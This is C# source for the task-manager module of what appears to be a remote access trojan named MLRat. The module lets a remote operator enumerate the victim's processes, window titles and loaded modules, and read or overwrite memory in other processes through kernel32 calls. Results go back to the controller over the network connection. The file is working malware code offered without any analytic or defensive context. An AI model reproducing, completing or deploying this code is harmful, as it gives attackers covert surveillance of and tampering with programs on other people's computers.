using MLRat.Client;
using SharedCode.Network;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace MLManagementClient.Handlers
{
    public static class TaskManagerHandler
    {
        static IClientHost NetworkHost = null;
        public static void SetNetworkHost(IClientHost connection)
        {
            NetworkHost = connection;
        }

        public static void Handle(object[] data)
        {
            TaskManagerCommand command = (TaskManagerCommand)data[1];

            if (command == TaskManagerCommand.GetProcesses) GetProcesses();
            if (command == TaskManagerCommand.WriteMemory)
            {
                int id = (int)data[2];
                string module = (string)data[3];
                int offset = (int)data[4];
                int newValue = (int)data[5];
                Process p = Process.GetProcessById(id);
                if (p.HasExited)
                {
                    NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.InvalidProcess);
                }
                else
                {
                    ProcessModule procMod = null;
                    foreach (ProcessModule m in p.Modules)
                    {
                        if (m.ModuleName == module)
                        {
                            procMod = m;
                            break;
                        }
                    }
                    try
                    {
                        if (procMod == null) return;
                        IntPtr addressWrite = (IntPtr)((int)procMod.BaseAddress + offset);
                        WriteProcessMemory(p.Handle, addressWrite, ref newValue, 4, 0);
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.InvalidProcess);
                    }
                }
            }
            if (command == TaskManagerCommand.ReadMemory)
            {
                int id = (int)data[2];
                string module = (string)data[3];
                int offset = (int)data[4];
                Process p = Process.GetProcessById(id);
                if (p.HasExited)
                {
                    NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.InvalidProcess);
                }
                else
                {
                    ProcessModule procMod = null;
                    foreach(ProcessModule m in p.Modules)
                    {
                        if(m.ModuleName == module)
                        {
                            procMod = m;
                            break;
                        }
                    }
                    try
                    {
                        if (procMod == null) return;
                        IntPtr addressRead = (IntPtr)((int)procMod.BaseAddress + offset);
                        int output = 0;
                        ReadProcessMemory(p.Handle, addressRead, ref output, 4, 0);
                        NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.MemoryValue, output);
                    }
                    catch(Exception ex)
                    {
                        Console.WriteLine(ex.ToString());
                        NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.InvalidProcess);
                    }
                }
            }
            if(command == TaskManagerCommand.GetModules)
            {
                int id = (int)data[2];
                Process p = Process.GetProcessById(id);
                if(p.HasExited)
                {
                    NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.InvalidProcess);
                }
                else
                {
                    string[] moduleNames = new string[p.Modules.Count];
                    for(int i = 0; i < moduleNames.Length; i++)
                    {
                        try
                        {
                            moduleNames[i] = p.Modules[i].ModuleName;
                        }
                        catch
                        {
                            moduleNames[i] = "InvalidModule";
                        }
                    }
                    NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ModuleResponce, moduleNames);
                }
            }
        }

        public static void GetProcesses()
        {
            Process[] allProcs = Process.GetProcesses();
            Process currentProc = Process.GetCurrentProcess();
            string[] ProcessNames = new string[allProcs.Length];
            int[] procIds = new int[allProcs.Length];
            string[] windowText = new string[allProcs.Length];
            //Image[] icons = new Image[allProcs.Length];
            //bool[] hasWindow = new bool[allProcs.Length];
            //Icon.ExtractAssociatedIcon();
            for (int i = 0; i < allProcs.Length; i++)
            {
                try
                {
                    ProcessNames[i] = allProcs[i].ProcessName;
                    procIds[i] = allProcs[i].Id;
                    windowText[i] = allProcs[i].MainWindowTitle;
                    try
                    {
                        string procLocation = allProcs[i].Modules[0].FileName;
                        //icons[i] = Icon.ExtractAssociatedIcon(procLocation).ToBitmap();
                    }
                    catch { }
                }
                catch
                {
                    ProcessNames[i] = "Access denied";
                    procIds[i] = 0;
                    windowText[i] = "Access denied";
                }
            }
            NetworkHost.Send((byte)NetworkCommand.TaskManager, (byte)TaskManagerCommand.ProcessList, ProcessNames, procIds, windowText, currentProc.Id);
        }

        [DllImport("kernel32.dll")]
        public static extern void WriteProcessMemory(IntPtr handle, IntPtr baseAddress, ref int buffer, int sizeBuffer, int BytesRead);

        [DllImport("Kernel32.dll")]
        private static extern void ReadProcessMemory(IntPtr handle, IntPtr baseAddress, ref int buffer, int sizeofBuffer, int bytesRead);
    }
}
